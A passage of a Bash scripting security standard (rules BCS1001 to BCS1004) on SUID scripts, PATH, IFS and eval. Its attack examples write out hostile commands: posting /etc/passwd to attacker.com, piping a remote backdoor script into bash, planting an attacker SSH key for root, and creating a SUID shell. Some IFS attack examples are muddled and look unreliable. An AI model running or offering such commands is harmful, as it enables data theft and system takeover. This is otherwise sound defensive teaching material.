# 4. Environment sanitization: Clears dangerous variables by default
# 5. Audit trail: Who ran what, when

# Configure specific commands in /etc/sudoers.d/myapp
username ALL=(root) NOPASSWD: /usr/local/bin/backup.sh
username ALL=(root) /usr/local/bin/restore.sh *

# User runs:
sudo /usr/local/bin/backup.sh
# Logged: "username : TTY=pts/0 ; PWD=/home/username ; USER=root ; COMMAND=/usr/local/bin/backup.sh"
```

**Real-world security incident example:**

In the early 2000s, many Unix systems had SUID root shell scripts for system administration tasks. Attackers exploited these through:
- IFS manipulation to execute arbitrary commands
- PATH attacks to substitute malicious interpreters
- Race conditions in temporary file handling
- Command injection through unchecked user input

Modern Linux distributions (since ~2005) ignore SUID bits on scripts by default, but:
- Many Unix variants still honor them
- Legacy systems may be vulnerable
- Scripts deployed to unknown systems may be exploited
- The practice itself is fundamentally unsafe

**Summary:**

- **Never** use SUID or SGID on shell scripts under any circumstances
- Shell scripts have too many attack vectors to be safe with elevated privileges
- Use `sudo` with carefully configured permissions instead
- For compiled programs needing specific privileges, use capabilities
- Use setuid wrappers (compiled C) if you absolutely must execute a script with privileges
- Audit your systems regularly for SUID/SGID scripts: `find / -type f \( -perm -4000 -o -perm -2000 \) -exec file {} \;`
- Remember: Convenience is never worth the security risk of SUID shell scripts

**Key principle:** If you think you need SUID on a shell script, you're solving the wrong problem. Redesign your solution using sudo, PolicyKit, systemd services, or a compiled wrapper.


---


**Rule: BCS1002**

## PATH Security

**Always secure the PATH variable to prevent command substitution attacks and trojan binary injection. An insecure PATH is one of the most common attack vectors in shell scripts.**

**Rationale:**

- **Command Hijacking**: Attacker-controlled directories in PATH allow malicious binaries to replace system commands
- **Current Directory Risk**: `.` or empty elements in PATH cause commands to execute from the current directory
- **Privilege Escalation**: Scripts running with elevated privileges can be tricked into executing attacker code
- **Search Order Matters**: Earlier directories in PATH are searched first, allowing priority-based attacks
- **Environment Inheritance**: PATH is inherited from the caller's environment, which may be malicious
- **Defense in Depth**: Securing PATH is a critical layer of defense even when other precautions are taken

**Lock down PATH at script start:**

```bash
#!/bin/bash
set -euo pipefail

# ✓ Correct - set secure PATH immediately
readonly PATH='/usr/local/bin:/usr/bin:/bin'
export PATH

# Rest of script uses locked-down PATH
command=$(which ls)  # Searches only trusted directories
```

**Alternative: Validate existing PATH:**

```bash
#!/bin/bash
set -euo pipefail

# ✓ Correct - validate PATH contains no dangerous elements
[[ "$PATH" =~ \.  ]] && die 1 'PATH contains current directory' ||:
[[ "$PATH" =~ ^:  ]] && die 1 'PATH starts with empty element' ||:
[[ "$PATH" =~ ::  ]] && die 1 'PATH contains empty element' ||:
[[ "$PATH" =~ :$  ]] && die 1 'PATH ends with empty element' ||:

# Additional checks for suspicious paths
[[ "$PATH" =~ /tmp ]] && die 1 'PATH contains /tmp' ||:
[[ "$PATH" =~ ^/home ]] && die 1 'PATH starts with user home directory' ||:
```

**Attack Example 1: Current Directory in PATH**

```bash
# Vulnerable script (doesn't set PATH)
#!/bin/bash
# /usr/local/bin/backup.sh
set -euo pipefail

# Script intends to use system ls
ls -la /etc > /tmp/backup_list.txt
```

**Attack:**
```bash
# Attacker creates malicious 'ls' in /tmp
cat > /tmp/ls << 'EOT'
#!/bin/bash
# Steal sensitive data
cp /etc/shadow /tmp/stolen_shadow
chmod 644 /tmp/stolen_shadow
# Now execute real ls to appear normal
/bin/ls "$@"
EOT
chmod +x /tmp/ls

# Attacker sets PATH with /tmp first
export PATH=/tmp:$PATH

# When victim runs backup script from /tmp:
cd /tmp
/usr/local/bin/backup.sh

# Script executes /tmp/ls instead of /bin/ls
# Attacker's code runs with script's privileges
```

**Attack Example 2: Empty PATH Element**

```bash
# PATH with empty element (double colon)
PATH=/usr/local/bin::/usr/bin:/bin

# Empty element is interpreted as current directory
# Same risk as PATH=.:/usr/local/bin:/usr/bin:/bin
```

**Attack:**
```bash
# Attacker creates malicious command in accessible directory
cat > ~/tar << 'EOT'
#!/bin/bash
# Exfiltrate data
curl -X POST -d @/etc/passwd https://attacker.com/collect
# Execute real command
/bin/tar "$@"
EOT
chmod +x ~/tar

# Vulnerable script runs from ~
cd ~
# With :: in PATH, searches current directory (~/tar found!)
tar -czf backup.tar.gz data/
```

**Attack Example 3: Writable Directory in PATH**

```bash
# PATH includes /opt/local/bin which is world-writable (misconfigured)
PATH=/opt/local/bin:/usr/local/bin:/usr/bin:/bin
```

**Attack:**
```bash
# Attacker creates trojan in writable PATH directory
cat > /opt/local/bin/ps << 'EOT'
#!/bin/bash
# Backdoor: Add SSH key for root access
mkdir -p /root/.ssh
echo "ssh-rsa AAAA... attacker@evil" >> /root/.ssh/authorized_keys
# Execute real ps
/bin/ps "$@"
EOT
chmod +x /opt/local/bin/ps

# When ANY script runs 'ps', attacker gains root access
```

**Secure PATH patterns:**

**Pattern 1: Complete lockdown (recommended for security-critical scripts):**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

# Lock down PATH immediately
readonly PATH='/usr/local/bin:/usr/bin:/bin:/usr/local/sbin:/usr/sbin:/sbin'
export PATH

# Use commands with confidence
tar -czf /backup/data.tar.gz /var/data
systemctl restart nginx
```

**Pattern 2: Full command paths (maximum security):**

```bash
#!/bin/bash
set -euo pipefail

# Don't rely on PATH at all - use absolute paths
/bin/tar -czf /backup/data.tar.gz /var/data
/usr/bin/systemctl restart nginx
/usr/bin/apt-get update

# Especially critical for common commands that might be trojaned
/bin/rm -rf /tmp/workdir
/bin/cat /etc/passwd | /bin/grep root
```

**Pattern 3: PATH validation with fallback:**

```bash
#!/bin/bash
set -euo pipefail

validate_path() {
  # Check for dangerous PATH elements
  if [[ "$PATH" =~ \\.  ]] || \
     [[ "$PATH" =~ ^:  ]] || \
     [[ "$PATH" =~ ::  ]] || \
     [[ "$PATH" =~ :$  ]] || \
     [[ "$PATH" =~ /tmp ]]; then
    # PATH is suspicious, reset to safe default
    export PATH='/usr/local/bin:/usr/bin:/bin'
    readonly PATH
    warn 'Suspicious PATH detected, reset to safe default'
  fi
}

validate_path

# Rest of script
```

**Pattern 4: Command verification:**

```bash
#!/bin/bash
set -euo pipefail

# Verify critical commands are from expected locations
verify_command() {
  local cmd=$1
  local expected_path=$2
  local actual_path

  actual_path=$(command -v "$cmd")

  if [[ "$actual_path" != "$expected_path" ]]; then
    die 1 "Security: $cmd is $actual_path, expected $expected_path"
  fi
}

# Verify before using critical commands
verify_command tar /bin/tar
verify_command rm /bin/rm
verify_command systemctl /usr/bin/systemctl

# Now safe to use
tar -czf backup.tar.gz data/
```

**Anti-patterns to avoid:**

```bash
# ✗ Wrong - trusting inherited PATH
#!/bin/bash
set -euo pipefail
# No PATH setting - inherits from environment
ls /etc  # Could execute trojan ls from anywhere in caller's PATH

# ✗ Wrong - PATH includes current directory
export PATH=.:$PATH
# Now any command can be hijacked from current directory

# ✗ Wrong - PATH includes /tmp
export PATH=/tmp:/usr/local/bin:/usr/bin:/bin
# /tmp is world-writable, attacker can place trojans there

# ✗ Wrong - PATH includes user home directories
export PATH=/home/user/bin:$PATH
# Attacker may have write access to /home/user/bin

# ✗ Wrong - empty elements in PATH
export PATH=/usr/local/bin::/usr/bin:/bin  # :: is current directory
export PATH=:/usr/local/bin:/usr/bin:/bin  # Leading : is current directory
export PATH=/usr/local/bin:/usr/bin:/bin:  # Trailing : is current directory

# ✗ Wrong - setting PATH late in script
#!/bin/bash
set -euo pipefail
# Commands here use inherited PATH (dangerous!)
whoami
hostname
# Only now setting secure PATH (too late!)
export PATH='/usr/bin:/bin'

# ✓ Correct - set PATH at top of script
#!/bin/bash
set -euo pipefail
readonly PATH='/usr/local/bin:/usr/bin:/bin'
export PATH
# Now all commands use secure PATH
```

**Edge case: Scripts that need custom paths:**

```bash
#!/bin/bash
set -euo pipefail

# Start with secure base PATH
readonly BASE_PATH='/usr/local/bin:/usr/bin:/bin'

# Add application-specific paths
readonly APP_PATH='/opt/myapp/bin'

# Combine with secure base first
export PATH="$BASE_PATH:$APP_PATH"
readonly PATH

# Validate application path exists and is not world-writable
[[ -d "$APP_PATH" ]] || die 1 "Application path does not exist ${APP_PATH@Q}"
[[ -w "$APP_PATH" ]] && die 1 "Application path is writable ${APP_PATH@Q}"

# Use commands from combined PATH
myapp-command --option
```

**Special consideration: Sudo and PATH:**

```bash
# When using sudo, PATH is reset by default
# /etc/sudoers typically includes:
# Defaults secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"

# ✓ This is safe - sudo uses secure_path
sudo /usr/local/bin/backup.sh

# ✗ This preserves user's PATH (dangerous if env_keep includes PATH)
# Don't configure sudoers with: Defaults env_keep += "PATH"

# ✓ Correct - script sets its own PATH regardless
sudo /usr/local/bin/backup.sh
# Even if sudo preserves PATH, script overwrites it:
#   readonly PATH='/usr/local/bin:/usr/bin:/bin'
```

**Checking PATH from within script:**

```bash
# Debug: Show PATH being used
debug() {
  >&2 echo "DEBUG: Current PATH=$PATH"
  >&2 echo "DEBUG: which tar=$(command -v tar)"
  >&2 echo "DEBUG: which rm=$(command -v rm)"
}

((DEBUG)) && debug

# Verify PATH doesn't contain dangerous elements
check_path_security() {
  local -a issues=()

  [[ "$PATH" =~ \\.  ]] && issues+=('contains current directory (.)') ||:
  [[ "$PATH" =~ ^:  ]] && issues+=('starts with empty element') ||:
  [[ "$PATH" =~ ::  ]] && issues+=('contains empty element (::)') ||:
  [[ "$PATH" =~ :$  ]] && issues+=('ends with empty element') ||:
  [[ "$PATH" =~ /tmp ]] && issues+=('contains /tmp') ||:

  if ((${#issues[@]} > 0)); then
    error 'PATH security issues detected:'
    local issue
    for issue in "${issues[@]}"; do
      error "  - $issue"
    done
    return 1
  fi

  info 'PATH security check passed'
  return 0
}

check_path_security || die 1 'PATH security validation failed'
```

**System-wide PATH security:**

```bash
# Check system default PATH in /etc/environment
cat /etc/environment
# Should be: PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"

# Check for world-writable directories in system PATH
IFS=':' read -ra path_dirs <<< "$PATH"
for dir in "${path_dirs[@]}"; do
  if [[ -d "$dir" && -w "$dir" ]]; then
    warn "World-writable directory in PATH ${dir@Q}"
  fi
done

# Find world-writable directories in PATH
find $(echo "$PATH" | tr ':' ' ') -maxdepth 0 -type d -writable 2>/dev/null
```

**Real-world example: Distribution installer script:**

```bash
#!/bin/bash
# Secure installer script for system-wide deployment
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

# Lock down PATH immediately - critical for security
readonly PATH='/usr/local/bin:/usr/bin:/bin:/usr/local/sbin:/usr/sbin:/sbin'
export PATH

VERSION=1.0.0
SCRIPT_NAME=$(basename "$0")

# Script metadata
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
readonly VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

# Verify we're using expected command locations
command -v tar | grep -q '^/bin/tar$' || \
  die 1 'Security: tar command not from /bin/tar'

# Rest of secure installation logic
```

**Summary:**

- **Always set PATH** explicitly at the start of security-critical scripts
- **Use `readonly PATH`** to prevent later modification
- **Never include** `.` (current directory), empty elements, `/tmp`, or user directories
- **Validate PATH** if you must use inherited environment
- **Use absolute paths** for critical commands as defense in depth
- **Place PATH setting early** - first few lines after `set -euo pipefail`
- **Check permissions** on directories in PATH (none should be world-writable)
- **Test PATH security** as part of your script testing process

**Key principle:** PATH is trusted implicitly by command execution. An attacker who controls your PATH controls which code runs. Always secure it first.


---


**Rule: BCS1003**

## IFS Manipulation Safety

**Never trust or use inherited IFS values. Always protect IFS changes to prevent field splitting attacks and unexpected behavior.**

**Rationale:**

- **Security Vulnerability**: Attackers can manipulate IFS in the calling environment to exploit scripts that don't protect IFS
- **Field Splitting Exploits**: Malicious IFS values cause word splitting at unexpected characters, breaking argument parsing
- **Command Injection**: IFS manipulation combined with unquoted variables enables command execution
- **Global Side Effects**: Changing IFS without restoration breaks subsequent operations throughout the script
- **Environment Inheritance**: IFS is inherited from parent processes and may be attacker-controlled
- **Subtle Bugs**: IFS changes cause hard-to-debug issues when forgotten or improperly scoped

**Understanding IFS:**

IFS (Internal Field Separator) controls how Bash splits words during expansion. Default is `$' \t\n'` (space, tab, newline).

```bash
# Default IFS behavior
IFS=$' \t\n'  # Space, tab, newline (default)
data="one two three"
read -ra words <<< "$data"
# Result: words=("one" "two" "three")

# Custom IFS for CSV parsing
IFS=','
data="apple,banana,orange"
read -ra fruits <<< "$data"
# Result: fruits=("apple" "banana" "orange")
```

**Attack Example 1: Field Splitting Exploitation**

```bash
# Vulnerable script - doesn't protect IFS
#!/bin/bash
set -euo pipefail

# Script expects space-separated list
process_files() {
  local -- file_list=$1
  local -a files

  # Vulnerable: IFS could be manipulated
  read -ra files <<< "$file_list"

  for file in "${files[@]}"; do
    rm -- "$file"  # Deletes each file
  done
}

# Normal usage
process_files "temp1.txt temp2.txt temp3.txt"
# Deletes: temp1.txt, temp2.txt, temp3.txt
```

**Attack:**
```bash
# Attacker sets IFS to slash
export IFS='/'
./vulnerable-script.sh

# Inside the script, file_list="temp1.txt temp2.txt"
# With IFS='/', read -ra splits on '/' not spaces!
# files=("temp1.txt temp2.txt")  # NOT split - treated as one filename!

# Or worse - attacker uses this to bypass filtering:
export IFS=$'\n'
./vulnerable-script.sh "/etc/passwd
/root/.ssh/authorized_keys"
# Now the script processes these filenames as if they were in the list
```

**Attack Example 2: Command Injection via IFS**

```bash
# Vulnerable script
#!/bin/bash
set -euo pipefail

# Process user-provided command with arguments
user_input=$1
# Split on spaces to get command and arguments
read -ra cmd_parts <<< "$user_input"

# Execute command
"${cmd_parts[@]}"
```

**Attack:**
```bash
# Attacker manipulates IFS before calling script
export IFS='X'
./vulnerable-script.sh "lsX-laX/etc/shadow"

# With IFS='X', the splitting becomes:
# cmd_parts=("ls" "-la" "/etc/shadow")
# Script executes: ls -la /etc/shadow
# Attacker bypassed any input validation that checked for spaces!
```

**Attack Example 3: Privilege Escalation via SUID Script**

```bash
# Vulnerable SUID script (should never exist, but illustrative)
#!/bin/bash
# /usr/local/bin/backup.sh (SUID root - NEVER DO THIS!)

# Supposed to back up only allowed directories
allowed_dirs='home var opt'

# Check if user-provided directory is allowed
user_dir=$1
is_allowed=0

for dir in $allowed_dirs; do  # Unquoted expansion uses IFS!
  [[ "$user_dir" == "$dir" ]] && is_allowed=1 ||:
done

((is_allowed)) || die 5 "Directory not allowed: $user_dir"

# Back up the directory with root privileges
tar -czf "/backup/${user_dir}.tar.gz" "/$user_dir"
```

**Attack:**
```bash
# Attacker sets IFS to 'e'
export IFS='e'
/usr/local/bin/backup.sh "etc"

# The loop splits "home var opt" on 'e':
# Results in words: "hom" " var opt"
# None match "etc", but if validation was bypassed differently...

# More direct attack - set IFS to include the target:
export IFS=' e'
# Now "home" splits to "hom " "
# The attacker can craft IFS to make "etc" appear in the allowed list
```

**Safe Pattern 1: Save and Restore IFS (Explicit)**

```bash
# ✓ Correct - save, modify, restore
parse_csv() {
  local -- csv_data=$1
  local -a fields
  local -- saved_ifs

  # Save current IFS
  saved_ifs="$IFS"

  # Set IFS for CSV parsing
  IFS=','
  read -ra fields <<< "$csv_data"

  # Restore IFS immediately
  IFS="$saved_ifs"

  # Process fields with original IFS restored
  for field in "${fields[@]}"; do
    info "Field: $field"
  done
}
```

**Safe Pattern 2: Subshell Isolation (Preferred)**

```bash
# ✓ Correct - IFS change isolated to subshell
parse_csv() {
  local -- csv_data=$1
  local -a fields

  # Use subshell - IFS change automatically reverts when subshell exits
  fields=( $(
    IFS=','
    read -ra temp <<< "$csv_data"
    printf '%s\n' "${temp[@]}"
  ) )

  # Or simpler - capture in subshell directly
  IFS=',' read -ra fields <<< "$csv_data"  # This also works in some contexts

  # Process with original IFS intact
  for field in "${fields[@]}"; do
    info "Field: $field"
  done
}
```

**Safe Pattern 3: Local IFS in Function**

```bash
# ✓ Correct - use local to scope IFS change
parse_csv() {
  local -- csv_data=$1
  local -a fields
  local -- IFS  # Make IFS local to this function

  # Now changes to IFS only affect this function
  IFS=','
  read -ra fields <<< "$csv_data"

  # IFS automatically restored when function returns
  for field in "${fields[@]}"; do
    info "Field: $field"
  done
}

# After function returns, IFS is unchanged in caller
```

**Safe Pattern 4: One-Line IFS Assignment**

```bash
# ✓ Correct - IFS change applies only to single command
# This is a bash feature: VAR=value command applies VAR only to that command

# Parse CSV in one line
IFS=',' read -ra fields <<< "$csv_data"
# IFS is automatically reset after the read command

# Parse colon-separated PATH
IFS=':' read -ra path_dirs <<< "$PATH"
# IFS is automatically reset after the read command

# This is the most concise and safe pattern for single operations
```

**Safe Pattern 5: Explicitly Set IFS at Script Start**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

# Explicitly set IFS to known-safe value at script start
# This defends against inherited malicious IFS
IFS=$' \t\n'  # Space, tab, newline (standard default)
readonly IFS  # Prevent modification
export IFS

# Rest of script operates with trusted IFS
# Any attempt to modify IFS will fail due to readonly
```

**Edge case: IFS with read -d (delimiter)**

```bash
# When using read -d, IFS still matters for field splitting
# The delimiter (-d) determines where to stop reading
# IFS determines how to split what was read

# Reading null-delimited input (common with find -print0)
while IFS= read -r -d '' file; do
  # IFS= prevents field splitting
  # -d '' sets null byte as delimiter
  process "$file"
done < <(find . -type f -print0)

# This is the safe pattern for filenames with spaces
```

**Edge case: IFS and globbing**

```bash
# IFS affects word splitting, NOT pathname expansion (globbing)
IFS=':'
files=*.txt  # Glob expands normally

# But IFS affects how results are split if unquoted
echo $files  # Splits on ':' - WRONG!

# Always quote to prevent IFS-based splitting
echo "$files"  # Safe - no splitting
```

**Edge case: Empty IFS**

```bash
# Setting IFS='' (empty) disables field splitting entirely
IFS=''
data="one two three"
read -ra words <<< "$data"
# Result: words=("one two three")  # NOT split!

# This can be useful to preserve exact input
IFS= read -r line < file.txt  # Preserves leading/trailing whitespace
```

**Anti-patterns to avoid:**

```bash
# ✗ Wrong - modifying IFS without save/restore
IFS=','
read -ra fields <<< "$csv_data"
# IFS is now ',' for the rest of the script - BROKEN!

# ✓ Correct - save and restore
saved_ifs="$IFS"
IFS=','
read -ra fields <<< "$csv_data"
IFS="$saved_ifs"

# ✗ Wrong - trusting inherited IFS
#!/bin/bash
set -euo pipefail
# No IFS protection - vulnerable to manipulation!
read -ra parts <<< "$user_input"

# ✓ Correct - set IFS explicitly
#!/bin/bash
set -euo pipefail
IFS=$' \t\n'  # Set to known-safe value
readonly IFS
read -ra parts <<< "$user_input"

# ✗ Wrong - forgetting to restore IFS in error cases
saved_ifs="$IFS"
IFS=','
some_command || return 1  # IFS not restored on error!
IFS="$saved_ifs"

# ✓ Correct - use trap or subshell
(
  IFS=','
  some_command || return 1  # Subshell ensures IFS is restored
)

# ✗ Wrong - modifying IFS globally
IFS=$'\n'  # Changed for entire script
for line in $(cat file.txt); do
  process "$line"
done
# Now ALL subsequent operations use wrong IFS!

# ✓ Correct - isolate IFS change
while IFS= read -r line; do
  process "$line"
done < file.txt

# ✗ Wrong - using IFS for complex parsing
IFS=':' read -r user pass uid gid name home shell <<< "$passwd_line"
# Fragile - breaks if any field contains ':'

# ✓ Correct - use cut or awk for structured data
user=$(cut -d: -f1 <<< "$passwd_line")
uid=$(cut -d: -f3 <<< "$passwd_line")
```

**Complete safe example:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

# Set IFS to known-safe value immediately
IFS=$' \t\n'
readonly IFS
export IFS

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# Parse CSV data safely
parse_csv_file() {
  local -- csv_file=$1
  local -a records

  # Read file line by line
  local -a fields
  while IFS= read -r line; do
    # Parse CSV fields using subshell-isolated IFS
    (
      IFS=','
      read -ra fields <<< "$line"

      # Process fields
      info "Name: ${fields[0]}"
      info "Email: ${fields[1]}"
      info "Age: ${fields[2]}"
    )
  done < "$csv_file"
}

# Alternative: One-line IFS for each read
parse_csv_line() {
  local -- csv_line=$1
  local -a fields

  # IFS applies only to this read command
  IFS=',' read -ra fields <<< "$csv_line"

  # Process with normal IFS
  for field in "${fields[@]}"; do
    info "Field: $field"
  done
}

main() {
  parse_csv_file 'data.csv'
}

main "$@"

#fin
```

**Testing IFS safety:**

```bash
# Test script behavior with malicious IFS
test_ifs_safety() {
  # Save original IFS
  local -- original_ifs="$IFS"

  # Set malicious IFS
  IFS='/'

  # Run function that should be IFS-safe
  parse_csv_line "apple,banana,orange"

  # Verify IFS was restored
  if [[ "$IFS" == "$original_ifs" ]]; then
    success 'IFS properly protected'
  else
    error 'IFS leaked - security vulnerability!'
    return 1
  fi
}
```

**Checking current IFS:**

```bash
# Display current IFS (non-printable characters shown)
debug() {
  local -- ifs_visual
  ifs_visual=$(printf '%s' "$IFS" | cat -v)
  >&2 echo "DEBUG: Current IFS: [$ifs_visual]"
  >&2 echo "DEBUG: IFS length: ${#IFS}"
  >&2 printf 'DEBUG: IFS bytes: %s\n' "$(printf '%s' "$IFS" | od -An -tx1)"
}

# Verify IFS is default
verify_default_ifs() {
  local -- expected=$' \t\n'
  if [[ "$IFS" == "$expected" ]]; then
    info 'IFS is default (safe)'
  else
    warn 'IFS is non-standard'
    debug
  fi
}
```

**Summary:**

- **Set IFS explicitly** at script start: `IFS=$' \t\n'; readonly IFS`
- **Use subshells** to isolate IFS changes: `( IFS=','; read -ra fields <<< "$data" )`
- **Use one-line assignment** for single commands: `IFS=',' read -ra fields <<< "$data"`
- **Use local IFS** in functions to scope changes: `local -- IFS; IFS=','`
- **Always restore IFS** if modifying: `saved_ifs="$IFS"; IFS=','; ...; IFS="$saved_ifs"`
- **Never trust inherited IFS** - always set it yourself
- **Test IFS safety** as part of security validation

**Key principle:** IFS is a global variable that affects word splitting throughout your script. Treat it as security-critical and always protect changes with proper scoping or save/restore patterns.


---


**Rule: BCS1004**

## Eval Command

**Never use `eval` with untrusted input. Avoid `eval` entirely unless absolutely necessary, and even then, seek alternatives first.**

**Rationale:**

- **Code Injection**: `eval` executes arbitrary code, allowing complete system compromise if input is attacker-controlled
- **No Sandboxing**: `eval` runs with full script privileges, including file access, network operations, and command execution
- **Bypasses All Validation**: Even sanitized input can contain metacharacters that enable injection
- **Difficult to Audit**: Dynamic code construction makes security review nearly impossible
- **Error Prone**: Quoting and escaping requirements are complex and frequently implemented incorrectly
- **Better Alternatives Exist**: Almost every use case has a safer alternative using arrays, indirect expansion, or proper data structures

**Understanding eval:**

`eval` takes a string, performs all expansions on it, then executes the result as a command.

```bash
# Basic eval behavior
cmd='echo "Hello World"'
eval "$cmd"  # Executes: echo "Hello World"
# Output: Hello World

# The danger: eval performs expansion TWICE
var='$(whoami)'
eval "echo $var"  # First expansion: echo $(whoami)
                   # Second expansion: executes whoami command!
# Output: username
```

**Attack Example 1: Direct Command Injection**

```bash
# Vulnerable script - NEVER DO THIS!
#!/bin/bash
set -euo pipefail

# Script allows user to set a variable
user_input=$1

# Dangerous: eval executes arbitrary code
eval "$user_input"
```

**Attack:**
```bash
# Attacker provides malicious input
./vulnerable-script.sh 'rm -rf /tmp/*'
# Executes: rm -rf /tmp/*

# Or worse - exfiltrate data
./vulnerable-script.sh 'curl -X POST -d @/etc/passwd https://attacker.com/collect'

# Or install backdoor
./vulnerable-script.sh 'curl https://attacker.com/backdoor.sh | bash'

# Or create SUID shell
./vulnerable-script.sh 'cp /bin/bash /tmp/rootshell; chmod u+s /tmp/rootshell'
```

**Attack Example 2: Variable Name Injection**

```bash
# Vulnerable script - seems safe but isn't!
#!/bin/bash
set -euo pipefail

# User provides variable name and value
var_name=$1
var_value=$2

# Attempt to set variable dynamically - DANGEROUS!
eval "$var_name='$var_value'"

echo "Variable $var_name has been set"
```

**Attack:**
```bash
# Attacker injects command via variable name
./vulnerable-script.sh 'x=$(rm -rf /important/data)' 'ignored'

# The eval executes:
# x=$(rm -rf /important/data)='ignored'
# Which executes the command substitution!

# Or exfiltrate via variable value
./vulnerable-script.sh 'x' '$(cat /etc/shadow > /tmp/stolen)'
# The eval executes:
# x='$(cat /etc/shadow > /tmp/stolen)'
# Command substitution runs with script privileges!
```

**Attack Example 3: Escaped Character Bypass**

```bash
# Vulnerable script - attempts sanitization
#!/bin/bash
set -euo pipefail

# User input for calculation
user_expr=$1

# Attempt to sanitize - INSUFFICIENT!
sanitized="${user_expr//[^0-9+\\-*\\/]/}"  # Allow only digits and operators

# Still dangerous!
eval "result=$sanitized"
echo "Result: $result"
```

**Attack:**
```bash
# Attacker uses allowed characters maliciously
./vulnerable-script.sh '1+1)); curl https://attacker.com/steal?data=$(cat /etc/passwd); echo $((1'

# Or uses integer assignment to overwrite critical variables
./vulnerable-script.sh 'PATH=0'
# Now PATH is set to 0, breaking the script or enabling other attacks
```

**Attack Example 4: Log Injection via eval**

```bash
# Vulnerable logging function
log_event() {
  local -- event=$1
  local -- timestamp
  timestamp=$(date '+%Y-%m-%d %H:%M:%S')

  # Dangerous: eval used to expand variables in log template
  local -- log_template='echo "$timestamp - Event: $event" >> /var/log/app.log'
  eval "$log_template"
}

# Usage
user_action=$1
log_event "$user_action"
```

**Attack:**
```bash
# Attacker injects command via event parameter
./vulnerable-script.sh 'login"; cat /etc/shadow > /tmp/pwned; echo "'

# The eval executes:
# echo "2025-01-15 10:30:00 - Event: login"; cat /etc/shadow > /tmp/pwned; echo "" >> /var/log/app.log
# Three commands execute: echo, cat (malicious), echo
```

**Safe Alternative 1: Use Arrays for Command Construction**

```bash
# ✓ Correct - build command safely with array
build_find_command() {
  local -- search_path=$1
  local -- file_pattern=$2
  local -a cmd

  # Build command in array - no eval needed!
  cmd=(find "$search_path" -type f -name "$file_pattern")

  # Execute array safely
  "${cmd[@]}"
}

# Usage
build_find_command '/var/data' '*.txt'

# Array preserves exact arguments, no injection possible
```

**Safe Alternative 2: Use Indirect Expansion for Variable References**

```bash
# ✗ Wrong - using eval for variable indirection
var_name='HOME'
eval "value=\\$$var_name"  # Gets value of $HOME
echo "$value"

# ✓ Correct - use indirect expansion
var_name='HOME'
echo "${!var_name}"  # Direct syntax, no eval needed

# ✓ Correct - for assignment, use declare/printf
var_name='MY_VAR'
value='Hello World'
printf -v "$var_name" '%s' "$value"  # Assigns to MY_VAR safely
echo "${!var_name}"  # Access value
```

**Safe Alternative 3: Use Associative Arrays for Dynamic Data**

```bash
# ✗ Wrong - using eval to create dynamic variables
for i in {1..5}; do
  eval "var_$i='value $i'"  # Creates var_1, var_2, etc.
done

# ✓ Correct - use associative array
declare -A data
for i in {1..5}; do
  data["var_$i"]="value $i"
done

# Access values
echo "${data[var_3]}"  # value 3
```

**Safe Alternative 4: Use Functions Instead of Dynamic Code**

```bash
# ✗ Wrong - eval to select function dynamically
action=$1
eval "${action}_function"  # If action='malicious', dangerous!

# ✓ Correct - use case statement
case "$action" in
  start)   start_function ;;
  stop)    stop_function ;;
  restart) restart_function ;;
  status)  status_function ;;
  *)       die 22 "Invalid action ${action@Q}" ;;
esac

# ✓ Also correct - use array of function names
declare -A actions=(
  [start]=start_function
  [stop]=stop_function
  [restart]=restart_function
  [status]=status_function
)

if [[ -v "actions[$action]" ]]; then
  "${actions[$action]}"
else
  die 22 "Invalid action ${action@Q}"
fi
```

**Safe Alternative 5: Use Command Substitution for Output Capture**

```bash
# ✗ Wrong - eval for command output
cmd='ls -la /tmp'
eval "output=\$($cmd)"  # Dangerous!

# ✓ Correct - direct command substitution
output=$(ls -la /tmp)

# ✓ Correct - if command is in variable, use array
declare -a cmd=(ls -la /tmp)
output=$("${cmd[@]}")
```

**Safe Alternative 6: Use read for Parsing**

```bash
# ✗ Wrong - eval for parsing key=value pairs
config_line="PORT=8080"
eval "$config_line"  # Sets PORT variable - DANGEROUS!

# ✓ Correct - use read or parameter expansion
IFS='=' read -r key value <<< "$config_line"
declare -g "$key=$value"  # Still be careful with key validation!

# ✓ Better - validate key before assignment
if [[ "$key" =~ ^[A-Z_][A-Z0-9_]*$ ]]; then
  declare -g "$key=$value"
else
  die 22 "Invalid configuration key: $key"
fi
```

**Safe Alternative 7: Use Arithmetic Expansion for Math**

```bash
# ✗ Wrong - eval for arithmetic
user_expr="$1"
eval "result=$((user_expr))"  # Still risky!

# ✓ Correct - validate first, then use arithmetic
if [[ "$user_expr" =~ ^[0-9+\\-*/\\ ()]+$ ]]; then
  result=$((user_expr))
else
  die 22 "Invalid arithmetic expression: $user_expr"
fi

# ✓ Better - use bc for complex math (isolates operations)
result=$(bc <<< "$user_expr")
```

**Edge case: When eval seems necessary**

**Scenario: Dynamic variable names in loops**

```bash
# Seems to need eval
for service in nginx apache mysql; do
  eval "${service}_status=\$(systemctl is-active $service)"
done

# ✓ Better - use associative array
declare -A service_status
for service in nginx apache mysql; do
  service_status["$service"]=$(systemctl is-active "$service")
done
```

**Scenario: Sourcing configuration with variable expansion**

```bash
# Config file contains: APP_DIR="$HOME/myapp"
# Simple sourcing doesn't expand $HOME

# Seems to need eval
while IFS= read -r line; do
  eval "$line"
done < config.txt

# ✓ Better - source directly (bash expands variables)
source config.txt

# ✓ Even better - validate config file first
if [[ -f config.txt && -r config.txt ]]; then
  # Check for dangerous patterns
  if grep -qE '(eval|exec|`|\$\()' config.txt; then
    die 1 'Config file contains dangerous patterns'
  fi
  source config.txt
else
  die 2 'Config file not found or not readable'
fi
```

**Scenario: Building complex command with many options**

```bash
# Seems to need eval to build command string
cmd="find /data -type f"
[[ -n "$name_pattern" ]] && cmd="$cmd -name '$name_pattern'"
[[ -n "$size" ]] && cmd="$cmd -size '$size'"
